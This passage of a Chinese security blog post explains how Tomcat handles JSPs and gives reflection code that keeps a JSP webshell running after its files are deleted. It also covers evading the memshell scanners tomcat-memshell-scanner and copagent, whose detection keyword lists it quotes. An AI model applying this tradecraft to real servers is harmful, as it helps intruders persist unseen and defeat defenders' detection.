<pre><code class="hljs language-scss copyable" lang="scss">public void <span class="hljs-built_in">compile</span>() throws JasperException, FileNotFoundException {
      <span class="hljs-comment">//获取编译器，默认使用JDTCompiler编译</span>
        <span class="hljs-built_in">createCompiler</span>();
      <span class="hljs-comment">//通过isOutDated决定是否编译</span>
        if (jspCompiler.isOutDated()) {
            if (isRemoved()) {
                throw new <span class="hljs-built_in">FileNotFoundException</span>(jspUri);
            }
            try {
                <span class="hljs-comment">//删除已经生成的java和Class文件</span>
                jspCompiler<span class="hljs-selector-class">.removeGeneratedFiles</span>();
                jspLoader = null;
                <span class="hljs-comment">//编译</span>
                jspCompiler<span class="hljs-selector-class">.compile</span>();
                jsw<span class="hljs-selector-class">.setReload</span>(true);
                jsw<span class="hljs-selector-class">.setCompilationException</span>(null);
            ...
    }
<span class="copy-code-btn">复制代码</span></code></pre>
<p>下面我们分析如何将生成的class文件注册为Servlet。首先判断<code>theServlet</code>是否为空，如果为空则表示还没有为JSP文件创建过Servlet，则通过<code>InstanceManager.newInstance</code>创建Servlet,并将创建的Servlet保存在<code>theServlet</code>属性中。</p>
<pre><code class="hljs language-ini copyable" lang="ini">public Servlet getServlet() throws ServletException {
// getReloadInternal是否Reload默认为False，也就是说如果theServlet为true就会直接返回。
        if (getReloadInternal() || <span class="hljs-attr">theServlet</span> == null) {
            synchronized (this) {

                if (getReloadInternal() || <span class="hljs-attr">theServlet</span> == null) {
             //如果theServlet中有值则销毁该Servlet.
                    destroy()<span class="hljs-comment">;</span>
                    final Servlet servlet<span class="hljs-comment">;</span>
                    try {
                        //创建Servlet实例
                        InstanceManager <span class="hljs-attr">instanceManager</span> = InstanceManagerFactory.getInstanceManager(config)<span class="hljs-comment">;</span>
                        <span class="hljs-attr">servlet</span> = (Servlet) instanceManager.newInstance(ctxt.getFQCN(), ctxt.getJspLoader())<span class="hljs-comment">;</span>
                    } catch (Exception e) {
                        Throwable <span class="hljs-attr">t</span> = ExceptionUtils
                                .unwrapInvocationTargetException(e)<span class="hljs-comment">;</span>
                        ExceptionUtils.handleThrowable(t)<span class="hljs-comment">;</span>
                        throw new JasperException(t)<span class="hljs-comment">;</span>
                    }
                //初始化servlet
                    servlet.init(config)<span class="hljs-comment">;</span>
                    if (theServlet != null) {
                        ctxt.getRuntimeContext().incrementJspReloadCount()<span class="hljs-comment">;</span>
                    }
                //将servlet保存到theServlet中，theServlet由volatile修饰，在线程之间可以共享。
                    <span class="hljs-attr">theServlet</span> = servlet<span class="hljs-comment">;</span>
                    <span class="hljs-attr">reload</span> = <span class="hljs-literal">false</span><span class="hljs-comment">;</span>
                }
            }
        }
        return theServlet<span class="hljs-comment">;</span>
    }
<span class="copy-code-btn">复制代码</span></code></pre>
<p>下面有一个小知识点，<code>theServlet</code>是由<code>volatile</code>修饰的，在不同的线程之间可以共享，再通过<code>synchronized (this)</code>加锁，也就是说无论我们请求多少次，无论是哪个线程处理，只要<code>this</code>是一个值，那么<code>theServlet</code>属性的值是一样的，而<code>this</code>就是当前的<code>jspServletWrapper</code>，我们访问不同的JSP也是由不同的<code>jspServletWrapper</code>处理的。</p>
<p>最后就是调用<code>servlet.service</code>方法完成请求处理。</p>
<h2 data-id="heading-4">内存驻留分析</h2>
<p>上面我们已经分析完了JSP的处理逻辑，要想要完成内存驻留，我们要解决下面的问题。</p>
<ul>
<li>请求后不去检查JSP文件是否存在</li>
<li>theServlet中一直保存着我们的servlet，当我们请求对应url还能交给我们的servlet处理</li>
</ul>
<p>第二个问题比较容易，<code>theServlet</code>能否获取到Servlet或者获取到哪个Servlet和<code>jspServletWrapper</code>是有关的，而在<code>JspServlet#serviceJspFile</code>中，如果我们已经将Servlet注册过，可以根据url从<code>JspRuntimeContext</code>中获取得到对应的<code>jspServletWrapper</code>。</p>
<pre><code class="hljs language-java copyable" lang="java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serviceJspFile</span><span class="hljs-params">(HttpServletRequest request,
                                HttpServletResponse response, String jspUri,
                                <span class="hljs-type">boolean</span> precompile)</span>
        <span class="hljs-keyword">throws</span> ServletException, IOException {
        <span class="hljs-type">JspServletWrapper</span> <span class="hljs-variable">wrapper</span> <span class="hljs-operator">=</span> rctxt.getWrapper(jspUri);
        <span class="hljs-keyword">if</span> (wrapper == <span class="hljs-literal">null</span>) {
       ...
        }
        <span class="hljs-keyword">try</span> {
            wrapper.service(request, response, precompile);
        } <span class="hljs-keyword">catch</span> (FileNotFoundException fnfe) {
            handleMissingResource(request, response, jspUri);
        }
    }
<span class="copy-code-btn">复制代码</span></code></pre>
<h3 data-id="heading-5">绕过方法一</h3>
<p>下面解决<code>请求后不去检查JSP文件是否存在</code>问题，首先我想绕过下面的判断,如果我们能让</p>
<p><code>options.getDevelopment()</code>返回false就不会进入<code>complie</code>部分。</p>
<pre><code class="hljs language-scss copyable" lang="scss">if (options.getDevelopment() || mustCompile) {
                synchronized (this) {
                    if (options.getDevelopment() || mustCompile) {
                        <span class="hljs-comment">// The following sets reload to true, if necessary</span>
                        ctxt<span class="hljs-selector-class">.compile</span>();
                        mustCompile = false;
                    }
                }
            }
<span class="copy-code-btn">复制代码</span></code></pre>
<p><code>development</code>并不是一个<code>static</code>属性，所以不能直接修改，要拿到<code>options</code>的对象。</p>
<pre><code class="hljs language-ini copyable" lang="ini">private boolean <span class="hljs-attr">development</span> = <span class="hljs-literal">true</span><span class="hljs-comment">;</span>
<span class="copy-code-btn">复制代码</span></code></pre>
<p><code>options</code>对象被存储在<code>JspServlet</code>中，</p>
<pre><code class="hljs language-scala copyable" lang="scala">public <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">JspServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">HttpServlet</span> <span class="hljs-title">implements</span> <span class="hljs-title">PeriodicEventListener</span> </span>{
...
    <span class="hljs-keyword">private</span> transient <span class="hljs-type">Options</span> options;
<span class="copy-code-btn">复制代码</span></code></pre>
<p><code>MappingData</code>中保存了路由匹配的结果,<code>MappingData</code>的<code>wrapper</code>字段包含处理请求的<code>wrapper</code>，在Tomcat中，<code>Wrapper</code>代表一个Servlet，它负责管理一个 Servlet，包括的 Servlet的装载、初始化、执行以及资源回收。在<code>Wrapper</code>的<code>instance</code>属性中保存着<code>servlet</code>的实例，因此我们可以从<code>MappingData</code>中拿到<code>JspServlet</code>进而更改<code>options</code>的<code>development</code>属性值。</p>
<pre><code class="hljs language-ini copyable" lang="ini">public class MappingData {
    public Host <span class="hljs-attr">host</span> = null<span class="hljs-comment">;</span>
    public Context <span class="hljs-attr">context</span> = null<span class="hljs-comment">;</span>
    public int <span class="hljs-attr">contextSlashCount</span> = <span class="hljs-number">0</span><span class="hljs-comment">;</span>
    public Context<span class="hljs-section">[]</span> <span class="hljs-attr">contexts</span> = null<span class="hljs-comment">;</span>
    public Wrapper <span class="hljs-attr">wrapper</span> = null<span class="hljs-comment">;</span>
    public boolean <span class="hljs-attr">jspWildCard</span> = <span class="hljs-literal">false</span><span class="hljs-comment">;</span>
}
<span class="copy-code-btn">复制代码</span></code></pre>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.oschina.net%2Faction%2FGoToLink%3Furl%3Dhttp%253A%252F%252Fyx.seclover.com%252Fviews%252Fupload%252F38b52c1a2d8311ecb823fa163e8ef7b7.png" target="_blank" rel="nofollow noopener noreferrer" title="https://www.oschina.net/action/GoToLink?url=http%3A%2F%2Fyx.seclover.com%2Fviews%2Fupload%2F38b52c1a2d8311ecb823fa163e8ef7b7.png" ref="nofollow noopener noreferrer"><img src="" alt="" loading="lazy"></a></p>
<p>所以我们可以通过反射对<code>development</code>的属性修改，下面代码参考<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.oschina.net%2Faction%2FGoToLink%3Furl%3Dhttps%253A%252F%252Fwww.anquanke.com%252Fpost%252Fid%252F224698" target="_blank" rel="nofollow noopener noreferrer" title="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fwww.anquanke.com%2Fpost%2Fid%2F224698" ref="nofollow noopener noreferrer">Tomcat容器攻防笔记之JSP金蝉脱壳</a></p>
<pre><code class="hljs language-ini copyable" lang="ini">&#x3C;%
    //从request对象中获取request属性
    Field <span class="hljs-attr">requestF</span> = request.getClass().getDeclaredField(<span class="hljs-string">"request"</span>)<span class="hljs-comment">;</span>
    requestF.setAccessible(true)<span class="hljs-comment">;</span>
    Request <span class="hljs-attr">req</span> = (Request) requestF.get(request)<span class="hljs-comment">;</span>
    //获取MappingData
    MappingData <span class="hljs-attr">mappingData</span> = req.getMappingData()<span class="hljs-comment">;</span>
    //获取Wrapper
    Field <span class="hljs-attr">wrapperF</span> = mappingData.getClass().getDeclaredField(<span class="hljs-string">"wrapper"</span>)<span class="hljs-comment">;</span>
    wrapperF.setAccessible(true)<span class="hljs-comment">;</span>
    Wrapper <span class="hljs-attr">wrapper</span> = (Wrapper) wrapperF.get(mappingData)<span class="hljs-comment">;</span>
    //获取jspServlet对象
    Field <span class="hljs-attr">instanceF</span> = wrapper.getClass().getDeclaredField(<span class="hljs-string">"instance"</span>)<span class="hljs-comment">;</span>
    instanceF.setAccessible(true)<span class="hljs-comment">;</span>
    Servlet <span class="hljs-attr">jspServlet</span> = (Servlet) instanceF.get(wrapper)<span class="hljs-comment">;</span>
    //获取options中保存的对象 
    Field <span class="hljs-attr">Option</span> = jspServlet.getClass().getDeclaredField(<span class="hljs-string">"options"</span>)<span class="hljs-comment">;</span>
    Option.setAccessible(true)<span class="hljs-comment">;</span>
    EmbeddedServletOptions <span class="hljs-attr">op</span> = (EmbeddedServletOptions) Option.get(jspServlet)<span class="hljs-comment">;</span>
    //设置development属性为false
    Field <span class="hljs-attr">Developent</span> = op.getClass().getDeclaredField(<span class="hljs-string">"development"</span>)<span class="hljs-comment">;</span>
    Developent.setAccessible(true)<span class="hljs-comment">;</span>
    Developent.set(op,false)<span class="hljs-comment">;</span>
%>
<span class="copy-code-btn">复制代码</span></code></pre>
<p>既然已经分析好了，我们做一个测试， <strong>当我们第二次请求我们的脚本</strong><code>development</code><br>
<strong>的属性值已经被改为false,即使我们删除对应的</strong><code>jsp\java\Class</code><strong>文件，仍然还可以还可以正常请求shell。</strong></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.oschina.net%2Faction%2FGoToLink%3Furl%3Dhttp%253A%252F%252Fyx.seclover.com%252Fviews%252Fupload%252F38b70cc42d8311ecb823fa163e8ef7b7.png" target="_blank" rel="nofollow noopener noreferrer" title="https://www.oschina.net/action/GoToLink?url=http%3A%2F%2Fyx.seclover.com%2Fviews%2Fupload%2F38b70cc42d8311ecb823fa163e8ef7b7.png" ref="nofollow noopener noreferrer"><img src="" alt="" loading="lazy"></a></p>
<p><strong>那么经过修改后会不会导致后来上传的jsp文件都无法执行的问题呢？</strong></p>
<p>不会，因为每一个JSP文件，只有已经编译并且注册为Servlet后，<code>mustCompile</code>属性才会为False，默认为True，并且<code>mustCompile</code>也是由<code>volatile</code>修饰并且在<code>synchronized</code>加锁的代码块中，只有同一个<code>jspServletWrapper</code>的<code>mustCompile</code>的修改在下次请求时还有效。当然也不是说完全没有影响，<br>
<strong>如果我们想修改一个已经加载为</strong><code>Servlet</code> <strong>的JSP文件，即使修改了也不会生效。</strong></p>
<pre><code class="hljs language-ini copyable" lang="ini">if (options.getDevelopment() || mustCompile) {
                synchronized (this) {
                    if (options.getDevelopment() || mustCompile) {
                        ctxt.compile()<span class="hljs-comment">;</span>
                        <span class="hljs-attr">mustCompile</span> = <span class="hljs-literal">false</span><span class="hljs-comment">;</span>
                    }
                }
<span class="copy-code-btn">复制代码</span></code></pre>
<h3 data-id="heading-6">绕过方法二</h3>
<p>下一个我们有机会绕过的点在compile中，如果我们能让<code>isOutDated</code>返回false，也可以达到绕过的目的。</p>
<pre><code class="hljs language-scss copyable" lang="scss">public void <span class="hljs-built_in">compile</span>() throws JasperException, FileNotFoundException {
        <span class="hljs-built_in">createCompiler</span>();
        if (jspCompiler.isOutDated()) {
         ...
        }
    }
<span class="copy-code-btn">复制代码</span></code></pre>
<p>注意看下面的代码,在<code>isOutDated</code>中，当满足下面的条件则会返回false。<code>jsw</code>中保存的是<code>jspServletWarpper</code>对象，所以是不为null的，并且<code>modificationTestInterval</code>默认值是4也满足条件，所以我们现在要做的就是让<code>modificationTestInterval*1000</code>大于<code>System.currentTimeMillis()</code>,所以<br>
<strong>只要将</strong><code>**modificationTestInterval**</code> <strong>修改为一个比较大的值也可以达到绕过的目的。</strong></p>
<pre><code class="hljs language-scss copyable" lang="scss">public boolean <span class="hljs-built_in">isOutDated</span>(boolean checkClass) {
        if (jsw != null
                &#x26;&#x26; (ctxt.getOptions()<span class="hljs-selector-class">.getModificationTestInterval</span>() > <span class="hljs-number">0</span>)) {
            if (jsw.getLastModificationTest()
                    + (ctxt.getOptions()<span class="hljs-selector-class">.getModificationTestInterval</span>() * <span class="hljs-number">1000</span>) > System<span class="hljs-selector-class">.currentTimeMillis</span>()) {
                return false;
            }
        }
<span class="copy-code-btn">复制代码</span></code></pre>
<p><code>modificationTestInterval</code>也保存在<code>options</code>属性中，所以修改的方法和方法一类似，就不罗列代码了。</p>
<pre><code class="hljs language-java copyable" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EmbeddedServletOptions</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Options</span> {
...
   <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">modificationTestInterval</span> <span class="hljs-operator">=</span> <span class="hljs-number">4</span>;
    ...
}
<span class="copy-code-btn">复制代码</span></code></pre>
<h2 data-id="heading-7">查杀情况分析</h2>
<p><strong>tomcat-memshell-scanner</strong></p>
<p>这款工具会Dump出所有保存在<code>servletMappings</code>中的<code>Servlet</code>的信息，不过我们的JSPServlet并没有保存在<code>servletMappings</code>中，而是在<code>JspRuntimeContext#jsps</code>字段中，因此根本查不到。</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.oschina.net%2Faction%2FGoToLink%3Furl%3Dhttp%253A%252F%252Fyx.seclover.com%252Fviews%252Fupload%252F38a5e9442d8311ecb823fa163e8ef7b7.png" target="_blank" rel="nofollow noopener noreferrer" title="https://www.oschina.net/action/GoToLink?url=http%3A%2F%2Fyx.seclover.com%2Fviews%2Fupload%2F38a5e9442d8311ecb823fa163e8ef7b7.png" ref="nofollow noopener noreferrer"><img src="" alt="" loading="lazy"></a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.oschina.net%2Faction%2FGoToLink%3Furl%3Dhttp%253A%252F%252Fyx.seclover.com%252Fviews%252Fupload%252F38b692582d8311ecb823fa163e8ef7b7.png" target="_blank" rel="nofollow noopener noreferrer" title="https://www.oschina.net/action/GoToLink?url=http%3A%2F%2Fyx.seclover.com%2Fviews%2Fupload%2F38b692582d8311ecb823fa163e8ef7b7.png" ref="nofollow noopener noreferrer"><img src="" alt="" loading="lazy"></a></p>
<h3 data-id="heading-8">copagent</h3>
<p>JSP本质上也就是<code>Servlet</code>，编译好的Class继承了<code>HttpJspBase</code>，类图如下所示。</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.oschina.net%2Faction%2FGoToLink%3Furl%3Dhttp%253A%252F%252Fyx.seclover.com%252Fviews%252Fupload%252F38b571522d8311ecb823fa163e8ef7b7.png" target="_blank" rel="nofollow noopener noreferrer" title="https://www.oschina.net/action/GoToLink?url=http%3A%2F%2Fyx.seclover.com%2Fviews%2Fupload%2F38b571522d8311ecb823fa163e8ef7b7.png" ref="nofollow noopener noreferrer"><img src="" alt="" loading="lazy"></a></p>
<h4 data-id="heading-9">copagent流程分析</h4>
<p><code>copagent</code>首先获取所有已经加载的类，并创建了几个数组。</p>
<ul>
<li><code>riskSuperClassesName</code>中保存了<code>HttpServlet</code>，用于获取Servlet，因为我们注册的Servlet会直接或者间接继承<code>HttpServlet</code></li>
<li><code>riskPackage</code>保存了一些恶意的包名，比如冰蝎的包名为<code>net.rebeyond</code>，使用冰蝎连接webshell时会将自己的恶意类加载到内存，而这个恶意类也是以<code>net.rebeyond</code>为包名的</li>
<li><code>riskAnnotations</code>保存了SpringMVC中注解注册Controller的类型，显然是为了抓出所有SpringMVC中通过注解注册的Controller</li>
</ul>
<pre><code class="hljs language-arduino copyable" lang="arduino"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-type">static</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-type">void</span> <span class="hljs-title">catchThief</span><span class="hljs-params">(<span class="hljs-type">String</span> name, Instrumentation ins)</span></span>{
   ...
        List&#x3C;Class&#x3C;?>> resultClasses = <span class="hljs-keyword">new</span> ArrayList&#x3C;Class&#x3C;?>>();
        <span class="hljs-comment">// 获得所有已加载的类及类名</span>
        Class&#x3C;?>[] loadedClasses = ins.<span class="hljs-built_in">getAllLoadedClasses</span>();
        LogUtils.<span class="hljs-built_in">logit</span>(<span class="hljs-string">"Found All Loaded Classes    : "</span> + loadedClasses.length);
        List&#x3C;<span class="hljs-type">String</span>> loadedClassesNames = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayList</span>&#x3C;<span class="hljs-type">String</span>>();
        <span class="hljs-keyword">for</span>(Class&#x3C;?> cls: loadedClasses){
            loadedClassesNames.<span class="hljs-built_in">add</span>(cls.<span class="hljs-built_in">getName</span>());
        }
   ...
        <span class="hljs-comment">// 实现的可能具有 web shell 功能的父类名</span>
        List&#x3C;<span class="hljs-type">String</span>> riskSuperClassesName = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayList</span>&#x3C;<span class="hljs-type">String</span>>();
        riskSuperClassesName.<span class="hljs-built_in">add</span>(<span class="hljs-string">"javax.servlet.http.HttpServlet"</span>);
        <span class="hljs-comment">// 黑名单拦截</span>
        List&#x3C;<span class="hljs-type">String</span>> riskPackage = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayList</span>&#x3C;<span class="hljs-type">String</span>>();
        riskPackage.<span class="hljs-built_in">add</span>(<span class="hljs-string">"net.rebeyond."</span>);
        riskPackage.<span class="hljs-built_in">add</span>(<span class="hljs-string">"com.metasploit."</span>);
        <span class="hljs-comment">// 风险注解</span>
        List&#x3C;<span class="hljs-type">String</span>> riskAnnotations = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayList</span>&#x3C;<span class="hljs-type">String</span>>();
        riskAnnotations.<span class="hljs-built_in">add</span>(<span class="hljs-string">"org.springframework.stereotype.Controller"</span>);
      riskAnnotations.<span class="hljs-built_in">add</span>(<span class="hljs-string">"org.springframework.web.bind.annotation.RestController"</span>);      riskAnnotations.<span class="hljs-built_in">add</span>(<span class="hljs-string">"org.springframework.web.bind.annotation.RequestMapping"</span>);
        riskAnnotations.<span class="hljs-built_in">add</span>(<span class="hljs-string">"org.springframework.web.bind.annotation.GetMapping"</span>);
        riskAnnotations.<span class="hljs-built_in">add</span>(<span class="hljs-string">"org.springframework.web.bind.annotation.PostMapping"</span>);
        riskAnnotations.<span class="hljs-built_in">add</span>(<span class="hljs-string">"org.springframework.web.bind.annotation.PatchMapping"</span>);
        riskAnnotations.<span class="hljs-built_in">add</span>(<span class="hljs-string">"org.springframework.web.bind.annotation.PutMapping"</span>);
        riskAnnotations.<span class="hljs-built_in">add</span>(<span class="hljs-string">"org.springframework.web.bind.annotation.Mapping"</span>);
    ...
<span class="copy-code-btn">复制代码</span></code></pre>
<p>下面代码完成主要的检测逻辑，首先会检测包名和SpringMVC注解的类，检测到则添加到<code>resultClasses</code>中，并且修改<code>not_found</code>标志位为False，表示不检测<code>Servelt/Filter/Listener</code>类型的shell。</p>
<pre><code class="hljs language-scss copyable" lang="scss"><span class="hljs-built_in">for</span>(Class&#x3C;?> clazz: loadedClasses){
                Class&#x3C;?> target = clazz;
                boolean not_found = true;
      <span class="hljs-comment">//检测包名是否为恶意包名，如果是则设置not_found为false，代表已经被shell连接过了，跳过后面Servlet和Filter内存马部分的检测并Dump出恶意类的信息。</span>
                <span class="hljs-built_in">for</span>(String packageName: riskPackage){
                    <span class="hljs-built_in">if</span>(clazz.getName()<span class="hljs-selector-class">.startsWith</span>(packageName)){
                        resultClasses<span class="hljs-selector-class">.add</span>(clazz);
                        not_found = false;
                        ClassUtils<span class="hljs-selector-class">.dumpClass</span>(ins, clazz.getName(), false, Integer<span class="hljs-selector-class">.toHexString</span>(target.getClassLoader()<span class="hljs-selector-class">.hashCode</span>()));
                        break;
                    }
                }
    <span class="hljs-comment">//判断是否使用SpringMVC的注解注册Controller，如果是则Dump出使用注解的Controller的类的信息</span>
                <span class="hljs-built_in">if</span>(ClassUtils.isUseAnnotations(clazz, riskAnnotations)){
                    resultClasses<span class="hljs-selector-class">.add</span>(clazz);
                    not_found = false;
                    ClassUtils<span class="hljs-selector-class">.dumpClass</span>(ins, clazz.getName(), false, Integer<span class="hljs-selector-class">.toHexString</span>(target.getClassLoader()<span class="hljs-selector-class">.hashCode</span>()));
                }
      <span class="hljs-comment">//检测Servelt/Filter/Listener类型Webshell</span>
      <span class="hljs-built_in">if</span>(not_found){
                    <span class="hljs-comment">// 递归查找</span>
                    while (target != null &#x26;&#x26; !target.getName()<span class="hljs-selector-class">.equals</span>("java.lang.Object")){
                        <span class="hljs-comment">// 每次都重新获得目标类实现的所有接口</span>
                        interfaces = new ArrayList&#x3C;String>();
                        <span class="hljs-built_in">for</span>(Class&#x3C;?> cls: target.getInterfaces()){
                            interfaces<span class="hljs-selector-class">.add</span>(cls.getName());
                        }
                        <span class="hljs-built_in">if</span>( // 继承危险父类的目标类
                                (target.getSuperclass() != null &#x26;&#x26; riskSuperClassesName<span class="hljs-selector-class">.contains</span>(target.getSuperclass()<span class="hljs-selector-class">.getName</span>())) ||
                                        <span class="hljs-comment">// 实现特殊接口的目标类</span>
                                        target<span class="hljs-selector-class">.getName</span>()<span class="hljs-selector-class">.equals</span>("org.springframework.web.servlet.handler.AbstractHandlerMapping") ||
                                        interfaces<span class="hljs-selector-class">.contains</span>("javax.servlet.Filter") ||
                                        interfaces<span class="hljs-selector-class">.contains</span>("javax.servlet.Servlet") ||
                                        interfaces<span class="hljs-selector-class">.contains</span>("javax.servlet.ServletRequestListener")
                        )
                        {
     ...
                            <span class="hljs-built_in">if</span>(loadedClassesNames.contains(clazz.getName())){
                                resultClasses<span class="hljs-selector-class">.add</span>(clazz);
                                ClassUtils<span class="hljs-selector-class">.dumpClass</span>(ins, clazz.getName(), false, Integer<span class="hljs-selector-class">.toHexString</span>(clazz.getClassLoader()<span class="hljs-selector-class">.hashCode</span>()));
                            }else{
                               ...
                            }
                            break;
                        }
                        target = target<span class="hljs-selector-class">.getSuperclass</span>();
                    }
                }
<span class="copy-code-btn">复制代码</span></code></pre>
<p>我们主要关注<code>Servlet</code>的检测，首先获取当前Class的实现接口，如果Class的父类不为空并且父类不是<code>HttpServlet</code>，并且没有实现<code>Serlvet\Filter\ServletRequestListener</code>等接口则不会被添加到<code>resultClasses</code>但会递归的去检查父类。由于JSP文件实际继承了<code>HttpJspBase</code>，相当于间接继承了<code>HttpServlet</code>，所以是绕不过这里的检查的，不过没关系，这一步只是检查是否是Servlet，并不代表被检测出来了。</p>
<pre><code class="hljs language-scss copyable" lang="scss">while (target != null &#x26;&#x26; !target.getName()<span class="hljs-selector-class">.equals</span>("java.lang.Object")){
                        <span class="hljs-comment">// 每次都重新获得目标类实现的所有接口</span>
                        interfaces = new ArrayList&#x3C;String>();
                        <span class="hljs-built_in">for</span>(Class&#x3C;?> cls: target.getInterfaces()){
                            interfaces<span class="hljs-selector-class">.add</span>(cls.getName());
                        }
                        <span class="hljs-built_in">if</span>( // 继承危险父类的目标类
                                (target.getSuperclass() != null &#x26;&#x26; riskSuperClassesName<span class="hljs-selector-class">.contains</span>(target.getSuperclass()<span class="hljs-selector-class">.getName</span>())) ||
                                        <span class="hljs-comment">// 实现特殊接口的目标类</span>
                                        target<span class="hljs-selector-class">.getName</span>()<span class="hljs-selector-class">.equals</span>("org.springframework.web.servlet.handler.AbstractHandlerMapping") ||interfaces<span class="hljs-selector-class">.contains</span>("javax.servlet.Filter") ||interfaces<span class="hljs-selector-class">.contains</span>("javax.servlet.Servlet") ||interfaces<span class="hljs-selector-class">.contains</span>("javax.servlet.ServletRequestListener")
                        )
                        {
                            <span class="hljs-built_in">if</span>(loadedClassesNames.contains(clazz.getName())){
                                resultClasses<span class="hljs-selector-class">.add</span>(clazz);
                                ClassUtils<span class="hljs-selector-class">.dumpClass</span>(ins, clazz.getName(), false, Integer<span class="hljs-selector-class">.toHexString</span>(clazz.getClassLoader()<span class="hljs-selector-class">.hashCode</span>()));
                            }else{
                                LogUtils<span class="hljs-selector-class">.logit</span>("cannot find " + clazz.getName() + " classes in instrumentation");
                            }
                            break;
                      ...
                        }
                        target = target<span class="hljs-selector-class">.getSuperclass</span>();
                    }
<span class="copy-code-btn">复制代码</span></code></pre>
<p>下面是判断是否为恶意内容的核心，只有当<code>resultClasses</code>中包含了关键下面的关键字才会被标记为high，这里如果我们使用自定义马的话也是可以绕过的，但是如果要使用冰蝎,一定会被<code>javax.crypto.</code>加密包的规则检测到，如果是自定义加密算法也是可以绕过的。</p>
<pre><code class="hljs language-ini copyable" lang="ini">List&#x3C;String> <span class="hljs-attr">riskKeyword</span> = new ArrayList&#x3C;String>()<span class="hljs-comment">;</span>
        riskKeyword.add("javax.crypto.")<span class="hljs-comment">;</span>
        riskKeyword.add("ProcessBuilder")<span class="hljs-comment">;</span>
        riskKeyword.add("getRuntime")<span class="hljs-comment">;</span>
        riskKeyword.add("shell")<span class="hljs-comment">;</span>
...
        for(Class&#x3C;?> clazz: resultClasses){
            File <span class="hljs-attr">dumpPath</span> = PathUtils.getStorePath(clazz, <span class="hljs-literal">false</span>)<span class="hljs-comment">;</span>
            String <span class="hljs-attr">level</span> = <span class="hljs-string">"normal"</span><span class="hljs-comment">;</span>
            String <span class="hljs-attr">content</span> = PathUtils.getFileContent(dumpPath)<span class="hljs-comment">;</span>
            for(String keyword: riskKeyword){
                if(content.contains(keyword)){
                    <span class="hljs-attr">level</span> = <span class="hljs-string">"high"</span><span class="hljs-comment">;</span>
                    break<span class="hljs-comment">;</span>
                }
            }
<span class="copy-code-btn">复制代码</span></code></pre>
<h2 data-id="heading-10">自删除</h2>
<p>上面只是分析了如何让我们的JSP在删除了<code>JSP\java\Class</code>文件后还能访问，下面我们分析如何在<code>JSP</code>中实现删除<code>JSP\java\Class</code>文件，在<code>JspCompilationContext</code>保存着JSP编译的上下文信息，我们可以从中拿到<code>java/class</code>的绝对路径。</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.oschina.net%2Faction%2FGoToLink%3Furl%3Dhttp%253A%252F%252Fyx.seclover.com%252Fviews%252Fupload%252F38b4688e2d8311ecb823fa163e8ef7b7.png" target="_blank" rel="nofollow noopener noreferrer" title="https://www.oschina.net/action/GoToLink?url=http%3A%2F%2Fyx.seclover.com%2Fviews%2Fupload%2F38b4688e2d8311ecb823fa163e8ef7b7.png" ref="nofollow noopener noreferrer"><img src="" alt="" loading="lazy"></a></p>
<p>而<code>JspCompilationContext</code>对象保存在<code>JspServletWrapper</code>中，所以要先获取<code>JspServletWrapper</code>。</p>
<pre><code class="hljs language-arduino copyable" lang="arduino"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">JspServletWrapper</span><span class="hljs-params">(ServletConfig config, Options options,
            <span class="hljs-type">String</span> jspUri, JspRuntimeContext rctxt)</span> </span>{
        ...
        ctxt = <span class="hljs-keyword">new</span> <span class="hljs-built_in">JspCompilationContext</span>(jspUri, options,
                                         config.<span class="hljs-built_in">getServletContext</span>(),
                                         <span class="hljs-keyword">this</span>, rctxt);
    }
<span class="copy-code-btn">复制代码</span></code></pre>
<p><code>request.request.getMappingData().wrapper.instance.rctxt.jsps.get("/jsp.jsp")</code></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.oschina.net%2Faction%2FGoToLink%3Furl%3Dhttp%253A%252F%252Fyx.seclover.com%252Fviews%252Fupload%252F38a585802d8311ecb823fa163e8ef7b7.png" target="_blank" rel="nofollow noopener noreferrer" title="https://www.oschina.net/action/GoToLink?url=http%3A%2F%2Fyx.seclover.com%2Fviews%2Fupload%2F38a585802d8311ecb823fa163e8ef7b7.png" ref="nofollow noopener noreferrer"><img src="" alt="" loading="lazy"></a></p>
<p>下面是代码实现</p>
<pre><code class="hljs language-ini copyable" lang="ini">&#x3C;%
    //从request对象中获取request属性
    Field <span class="hljs-attr">requestF</span> = request.getClass().getDeclaredField(<span class="hljs-string">"request"</span>)<span class="hljs-comment">;</span>
    requestF.setAccessible(true)<span class="hljs-comment">;</span>
    Request <span class="hljs-attr">req</span> = (Request) requestF.get(request)<span class="hljs-comment">;</span>
    //获取MappingData
    MappingData <span class="hljs-attr">mappingData</span> = req.getMappingData()<span class="hljs-comment">;</span>
    //获取Wrapper，这里的Wrapper是StandrardWrapper
    Field <span class="hljs-attr">wrapperF</span> = mappingData.getClass().getDeclaredField(<span class="hljs-string">"wrapper"</span>)<span class="hljs-comment">;</span>
    wrapperF.setAccessible(true)<span class="hljs-comment">;</span>
    Wrapper <span class="hljs-attr">wrapper</span> = (Wrapper) wrapperF.get(mappingData)<span class="hljs-comment">;</span>
    //获取jspServlet对象
    Field <span class="hljs-attr">instanceF</span> = wrapper.getClass().getDeclaredField(<span class="hljs-string">"instance"</span>)<span class="hljs-comment">;</span>
    instanceF.setAccessible(true)<span class="hljs-comment">;</span>
